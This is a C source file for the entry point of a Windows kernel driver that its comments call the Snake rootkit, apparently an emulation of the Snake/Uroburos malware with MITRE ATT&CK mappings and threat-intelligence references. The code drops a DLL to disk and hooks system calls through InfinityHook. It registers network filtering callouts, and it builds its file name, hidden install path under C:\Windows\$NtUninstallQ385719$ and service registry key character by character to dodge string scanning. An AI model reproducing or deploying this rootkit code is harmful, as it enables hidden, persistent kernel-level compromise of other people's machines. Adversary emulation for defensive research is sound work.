#include <ntifs.h>
#include "driver.h"
#include "infinityhook.h"
#include "hooks.h"
#include "wfp.hpp"
#include "filesystem.hpp"

#ifdef __cplusplus
EXTERN_C
#endif
DRIVER_INITIALIZE DriverEntry;

UNICODE_STRING NT_DEVICE_NAME = RTL_CONSTANT_STRING(L"\\Device\\gusb");
UNICODE_STRING DOS_DEVICE_NAME = RTL_CONSTANT_STRING(L"\\DosDevices\\gusb");


void stringify();
void unstringify();
char gSysModName[9]; // "gusb.sys"

// externed in driver.h
PWCHAR gFiles[NUM_FILES];
WCHAR gFilesOne[9]; // L"gusb.sys"
PWCHAR gFilesFullPath[NUM_FILES_FULLPATH];
WCHAR gFilesFullPathOne[45]; // L"\\??\\C:\\Windows\\$NtUninstallQ385719$\\gusb.sys"

// externed in driver.h
PWCHAR gRegKeys[NUM_REGKEYS];
WCHAR gRegKeyOne[8]; // L"usbgig"
PWCHAR gRegKeysFullPath[NUM_REGKEYS_FULLPATH];
WCHAR gRegKeyFullPathOne[39]; // L"HKLM\SYSTEM\CurrentControlSet\Services\gusb"

VOID
DriverUnload(
    _In_ PDRIVER_OBJECT DriverObject
)
{
    wfp::cleanup();
    ::IoDeleteSymbolicLink(&DOS_DEVICE_NAME);
    ::IoDeleteDevice(DriverObject->DeviceObject);

    // Remove InfinityHook
    IfhRelease();
    kprintf("Unloading Snake\n");
    //unstringify();
    // Include a delay here to insure that any remaining activity in other threads is completed. Otherwise we risk a BSOD
    LARGE_INTEGER li = { 2000000000 };
    KeDelayExecutionThread(KernelMode, FALSE, &li);

    return;
}

/*
 * DriverEntry:
 *      About:
 *          Driver entry point for Snake rootkit. Drops usermodule DLL to disk, hooks various functions and begins injecting
 *          the usermodule DLL into user processes.
 *      Result:
 *          Returns STATUS_SUCCESS on success, otherwise some error status.
 *      MITRE ATT&CK Techniques:
 *          T1014: Rootkit
 *          T1055.001: Process Injection: Dynamic-link Library Injection
 *          T1055.004: Process Injection: Asynchronous Procedure Call
 *          T1140: Deobfuscate/Decode Files or Information
 *          T1027: Obfuscated Files or Information
 *          T1546: Event Triggered Execution
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 *          https://public.gdatasoftware.com/Web/Content/INT/Blog/2014/02_2014/documents/GData_Uroburos_RedPaper_EN_v1.pdf
 *          https://www.gdatasoftware.com/blog/2014/06/23953-analysis-of-uroburos-using-windbg
 */
#ifdef __cplusplus
EXTERN_C
#endif
NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT   DriverObject,
    _In_ PUNICODE_STRING  RegistryPath
)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    stringify();
    // Allow driver to be stopped/unloaded
    DriverObject->DriverUnload = DriverUnload;

    kprintf("Hello from Snake\n");

    NTSTATUS Status = write_file();
    if (NT_ERROR(Status)) {
        kprintf("Could not drop DLL: 0x%lx.\n", Status);
        return Status;
    }

    // Create device for WFP functionality
    Status = IoCreateDevice(
        DriverObject,
        0,
        &NT_DEVICE_NAME,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        true,
        &DriverObject->DeviceObject
    );
    if (NT_ERROR(Status)) {
        kprintf("Couldn't create the device object\n");
        return Status;
    }

    Status = ::IoCreateSymbolicLink(
        &DOS_DEVICE_NAME,
        &NT_DEVICE_NAME
    );
    if (NT_ERROR(Status)) {
        kprintf("Couldn't create symbolic link\n");
        ::IoDeleteDevice(DriverObject->DeviceObject);
        return Status;
    }

    // Initialize InfinityHook
    Status = IfhInitialize(SyscallStub);
    if (!NT_SUCCESS(Status))
    {
        kprintf("infinityhook: Failed to initialize with status: 0x%lx.\n", Status);
        ::IoDeleteSymbolicLink(&DOS_DEVICE_NAME);
        ::IoDeleteDevice(DriverObject->DeviceObject);
        return Status;
    }

    wfp::init(DriverObject->DeviceObject);
    wfp::register_callout();
    wfp::register_filter();

    return STATUS_SUCCESS;
}


void stringify() {
    gSysModName[0]  = 'g';
    gSysModName[1]  = 'u';
    gSysModName[2]  = 's';
    gSysModName[3]  = 'b';
    gSysModName[4]  = '.';
    gSysModName[5]  = 's';
    gSysModName[6]  = 'y';
    gSysModName[7]  = 's';
    gSysModName[8] = '\0';

    gFilesOne[0] = 'g';
    gFilesOne[1] = 'u';
    gFilesOne[2] = 's';
    gFilesOne[3] = 'b';
    gFilesOne[4] = '.';
    gFilesOne[5] = 's';
    gFilesOne[6] = 'y';
    gFilesOne[7] = 's';
    gFilesOne[8] = '\0';
    gFiles[0] = gFilesOne;

    gRegKeyOne[0] = L'g';
    gRegKeyOne[1] = L'u';
    gRegKeyOne[2] = L's';
    gRegKeyOne[3] = L'b';
    gRegKeyOne[4] = L'\0';
    gRegKeys[0] = gRegKeyOne;

    gRegKeyFullPathOne[0]  = L'S';
    gRegKeyFullPathOne[1]  = L'Y';
    gRegKeyFullPathOne[2]  = L'S';
    gRegKeyFullPathOne[3]  = L'T';
    gRegKeyFullPathOne[4]  = L'E';
    gRegKeyFullPathOne[5]  = L'M';
    gRegKeyFullPathOne[6]  = L'\\';
    gRegKeyFullPathOne[7]  = L'C';
    gRegKeyFullPathOne[8]  = L'u';
    gRegKeyFullPathOne[9]  = L'r';
    gRegKeyFullPathOne[10] = L'r';
    gRegKeyFullPathOne[11] = L'e';
    gRegKeyFullPathOne[12] = L'n';
    gRegKeyFullPathOne[13] = L't';
    gRegKeyFullPathOne[14] = L'C';
    gRegKeyFullPathOne[15] = L'o';
    gRegKeyFullPathOne[16] = L'n';
    gRegKeyFullPathOne[17] = L't';
    gRegKeyFullPathOne[18] = L'r';
    gRegKeyFullPathOne[19] = L'o';
    gRegKeyFullPathOne[20] = L'l';
    gRegKeyFullPathOne[21] = L'S';
    gRegKeyFullPathOne[22] = L'e';
    gRegKeyFullPathOne[23] = L't';
    gRegKeyFullPathOne[24] = L'\\';
    gRegKeyFullPathOne[25] = L'S';
    gRegKeyFullPathOne[26] = L'e';
    gRegKeyFullPathOne[27] = L'r';
    gRegKeyFullPathOne[28] = L'v';
    gRegKeyFullPathOne[29] = L'i';
    gRegKeyFullPathOne[30] = L'c';
    gRegKeyFullPathOne[31] = L'e';
    gRegKeyFullPathOne[32] = L's';
    gRegKeyFullPathOne[33] = L'\\';
    gRegKeyFullPathOne[34] = L'g';
    gRegKeyFullPathOne[35] = L'u';
    gRegKeyFullPathOne[36] = L's';
    gRegKeyFullPathOne[37] = L'b';
    gRegKeyFullPathOne[38] = L'\0';
    gRegKeysFullPath[0] = gRegKeyFullPathOne;

    gFilesFullPathOne[0] = L'\\';
    gFilesFullPathOne[1] = L'?';
    gFilesFullPathOne[2] = L'?';
    gFilesFullPathOne[3] = L'\\';
    gFilesFullPathOne[4] = L'C';
    gFilesFullPathOne[5] = L':';
    gFilesFullPathOne[6] = L'\\';
    gFilesFullPathOne[7] = L'W';
    gFilesFullPathOne[8] = L'i';
    gFilesFullPathOne[9] = L'n';
    gFilesFullPathOne[10] = L'd';
    gFilesFullPathOne[11] = L'o';
    gFilesFullPathOne[12] = L'w';
    gFilesFullPathOne[13] = L's';
    gFilesFullPathOne[14] = L'\\';
    gFilesFullPathOne[15] = L'$';
    gFilesFullPathOne[16] = L'N';
    gFilesFullPathOne[17] = L't';
    gFilesFullPathOne[18] = L'U';
    gFilesFullPathOne[19] = L'n';
    gFilesFullPathOne[20] = L'i';
    gFilesFullPathOne[21] = L'n';
    gFilesFullPathOne[22] = L's';
    gFilesFullPathOne[23] = L't';
    gFilesFullPathOne[24] = L'a';
    gFilesFullPathOne[25] = L'l';
    gFilesFullPathOne[26] = L'l';
    gFilesFullPathOne[27] = L'Q';
    gFilesFullPathOne[28] = L'3';
    gFilesFullPathOne[29] = L'8';
    gFilesFullPathOne[30] = L'5';
    gFilesFullPathOne[31] = L'7';
    gFilesFullPathOne[32] = L'1';
    gFilesFullPathOne[33] = L'9';
    gFilesFullPathOne[34] = L'$';
    gFilesFullPathOne[35] = L'\\';
    gFilesFullPathOne[36] = L'g';
    gFilesFullPathOne[37] = L'u';
    gFilesFullPathOne[38] = L's';
    gFilesFullPathOne[39] = L'b';
    gFilesFullPathOne[40] = L'.';
    gFilesFullPathOne[41] = L's';
    gFilesFullPathOne[42] = L'y';
    gFilesFullPathOne[43] = L's';
    gFilesFullPathOne[44] = L'\0';
    gFilesFullPath[0] = gFilesFullPathOne;
}

void unstringify() {
    // TODO: Should we zero out the strings here?
}